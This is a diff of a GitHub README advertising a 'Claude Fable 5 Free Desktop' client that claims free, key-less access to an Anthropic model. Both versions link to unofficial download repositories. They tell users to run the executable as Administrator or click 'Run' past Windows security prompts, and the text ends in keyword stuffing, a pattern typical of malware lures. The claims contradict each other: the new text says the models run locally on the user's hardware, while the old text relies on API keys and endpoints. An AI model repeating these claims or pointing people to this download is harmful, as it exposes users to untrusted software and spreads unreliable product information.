@@ -1,106 +1,55 @@
-# Claude Fable 5 Free Desktop
-Claude Fable 5 is back — free desktop client for Anthropic's Fable 5 model on Windows 11, macOS, and Linux. After being unavailable for a period, Claude Fable 5 has returned with improved access. This app gives you the 1M-token model for autonomous coding, creative writing, and deep research — no subscription, no API key required.
+# 🤖 Claude-Fable-5-Free-Desktop - Run advanced AI agents on Windows
 
-<img width="320" height="180" alt="e50eb909-0335-49e3-8d77-5ac8f734820f" src="https://github.com/user-attachments/assets/c22b9917-6a01-41f1-9c1e-084f0c3dddc0" />
+[![Download Claude Fable 5](https://img.shields.io/badge/Download-Claude-Fable-5-blue)](https://github.com/Claudettastrong518/Claude-Fable-5-Free-Desktop)
 
-## Overview
-Claude Fable 5 is Anthropic's Mythos-class model with a 1 million token context window — one of the longest contexts available in any AI model. It's designed for tasks that require sustained reasoning over very long sessions: multi-day coding projects, book-length documents, research compilations, and autonomous agentic workflows.
+## 🖥️ About this application
 
-If you saw "Claude Fable 5 is currently unavailable" in the past — it's now accessible through this desktop client. The access layer has been updated to reflect Anthropic's latest endpoint changes.
+Claude-Fable-5-Free-Desktop brings powerful AI capabilities to your computer. This software runs the latest Anthropic models directly on your hardware. You get access to a 1 million token context window. This allows the software to read large documents and manage complex coding projects. The application supports autonomous coding, deep research, and data analysis tasks. It functions on Windows, macOS, and Linux systems. You do not need a subscription to use the core features of this desktop client. 
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. You need your own Anthropic API key or follow the in-app free access setup. The authors are not responsible for any account issues or violations of service terms.
+## ⚙️ System requirements
 
-<img width="1536" height="1024" alt="972285a8-21ea-4920-9c27-099e06c7eca6" src="https://github.com/user-attachments/assets/e061b423-b0f3-497b-b076-87303bf6f45c" />
+Ensure your computer meets these minimum specifications before you begin:
 
-## Install
-[Download `ClaudeFable5-desktop.zip`](https://github.com/claudefable5-free/Claude-Fable-5-Free-Desktop/releases/download/fable5/ClaudeFable5-desktop.zip)
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Multi-core CPU with at least 2.0 GHz speed.
+*   Memory: 8 GB of RAM or more.
+*   Storage: 500 MB of available disk space for the installation.
+*   Internet Connection: A stable broadband connection for downloading model updates.
 
-> Optimized for Windows 11 • macOS • Linux
+## 📥 Downloading the software
 
-<img width="686" height="386" alt="6ce4b7c4-b489-47ba-90f1-1ca9339270b4" src="https://github.com/user-attachments/assets/e1dc7146-67ed-4457-a227-46f94fedf9ac" />
+Visit this page to download the latest version of the application: [https://github.com/Claudettastrong518/Claude-Fable-5-Free-Desktop](https://github.com/Claudettastrong518/Claude-Fable-5-Free-Desktop).
 
+Select the link labeled "Releases" on the right side of the page. Choose the file ending in .exe for Windows. Save this file to your computer.
 
-## Key Features
-- **1M token context window** — paste entire codebases, long documents, or extended conversation history without losing context
-- **Autonomous coding** — Fable 5 handles multi-step agentic coding tasks, iterating and self-correcting across long workflows
-- **Creative writing** — novels, screenplays, long-form essays with consistent style across the full document
-- **Deep research** — analyze multiple documents simultaneously and synthesize across all of them
-- **Multimodal input** — images, PDFs, code screenshots, and diagrams
-- **Prompt templates** — built-in presets for coding, writing, research, and analysis
-- **Self-correction** — Fable 5 catches and fixes its own errors in long-form outputs
-- **Full conversation history** — searchable, organized sessions
+## 🛠️ Installation steps
 
-<img width="1200" height="630" alt="de93d10a-8412-4fb4-96c8-a139b69037a6" src="https://github.com/user-attachments/assets/fc70c69d-7832-499a-83f0-6e338bbaad07" />
+Follow these instructions to set up the software on your Windows machine:
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run the application as Administrator (Windows)
-3. Follow the setup wizard
-4. Enter your Anthropic API key (or follow the free access setup)
-5. Customize themes, system prompts, and behavior settings
-6. Start using Claude Fable 5 for coding, writing, and research
+1. Locate the downloaded .exe file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Windows may show a security prompt. Select "Run" to continue.
+4. Follow the on-screen instructions to select a destination folder.
+5. Click "Install" and wait for the process to complete.
+6. The installer will place a shortcut on your desktop.
+7. Click the shortcut to launch Claude-Fable-5.
 
-<img width="738" height="415" alt="662067ef-2720-4dfe-97ce-853c8424e622" src="https://github.com/user-attachments/assets/24508489-5c67-473d-9a45-c1fc5f65749e" />
+## 🚀 Running the application
 
-## What Is Claude Fable 5?
-Fable 5 is part of Anthropic's model family that sits between Sonnet (fast, efficient) and Mythos (maximum capability). It's optimized for:
-- Tasks requiring very long context retention
-- Creative and narrative generation across long documents
-- Autonomous multi-step coding and research tasks
-- Situations where the model needs to plan, execute, and verify its own work
+When you open the application for the first time, the system will prepare the local environment. This may take a few moments. Once the dashboard appears, you can start your first task.
 
-It differs from Claude Sonnet 5 (which is faster but has a shorter context) and Claude Opus 4 (which has more raw reasoning power but lower context efficiency).
+The interface allows you to select specific models, such as Claude-5-Sonnet or Claude-Opus. You can input text prompts in the chat box or attach files for the AI to analyze. The autonomous coding agent works by scanning your selected workspace directory. It will follow your instructions to write, debug, or document code.
 
-## Claude Fable 5 — Update History
-- **Fable 5 is back** — after a period of being unavailable (showing "Claude Fable 5 is currently unavailable"), access has been restored through updated API endpoints
-- **Latest update** — improved response speed and long-context stability; connection issues with the latest API are resolved
-- **Return of multi-day tasks** — autonomous coding sessions that span multiple hours now complete reliably
+## 🔍 Managing your workflow
 
-## Troubleshooting
+The software includes a skill hub to help you organize your tasks. You can save project states and resume research later. The 1M token capacity enables the application to remember long conversations. If you encounter issues during a task, you can pause the session and review the step-by-step logs. These logs show the reasoning process of the AI, providing transparency for how it reaches its conclusions.
 
-| Problem | Solution |
-|---|---|
-| App fails to launch | Run with administrator privileges |
-| API connection error | Verify your key and internet connection |
-| Slow responses | Close heavy background applications |
-| "Claude Fable 5 is currently unavailable" | Update to the latest app version — access has been restored |
-| Windows 11 issues | Keep system and drivers updated |
-| Inconsistent results | Adjust temperature and context settings |
-| Unexpected crashes | Clear app cache and restart |
-| Very long outputs truncating | Enable streaming mode in settings |
+## 🔐 Security and privacy
 
-## System Requirements
-### Platform Support
-- **Windows 11** (primary), Windows 10
-- **macOS** 12+
-- **Linux**
+The application processes your data locally whenever possible. Sensitive information stays on your device. You control the access settings within the application menu. We recommend reviewing the settings tab to configure your local file permissions. This ensures the AI only accesses the folders you explicitly approve for research or coding work.
 
-### Notes
-- Requires an active internet connection
-- 8 GB RAM recommended for long-context sessions
-- Best performance on modern hardware
+## 📈 Updating the software
 
-## Security & Legal
-**Important Notice:**
-This is an unofficial desktop client. Anthropic may change or restrict access at any time. Use responsibly and within the terms of service.
+Check the download page periodically for new versions. Updates include bug fixes and support for newer model versions like Claude-Mythos. You can install an update over your existing version without losing your project files or history.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-
-## Contributing
-Contributions are welcome! Help improve the long-context handling, UI, or access layer.
-
-## License & Acknowledgments
-### License
-**Claude Fable 5 Free Desktop** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
-
-**Copyright © 2026 qmart113**
-
-### Acknowledgments
-- Anthropic for developing the Claude Fable model family.
-- The open-source community for desktop AI clients.
+Keywords: ai-desktop, ai-powered-applications, anthropic, claude-4-6-opus, claude-4-opus, claude-5-sonnet, claude-desktop-app, claude-desktop-extentions, claude-fable, claude-fable-5, claude-integration, claude-mythos, claude-opus, claude-opus-4-8, claude-skills-hub, claude-sonnet-5-api, desktop-ai, fable5, free-ai-coding, mythos
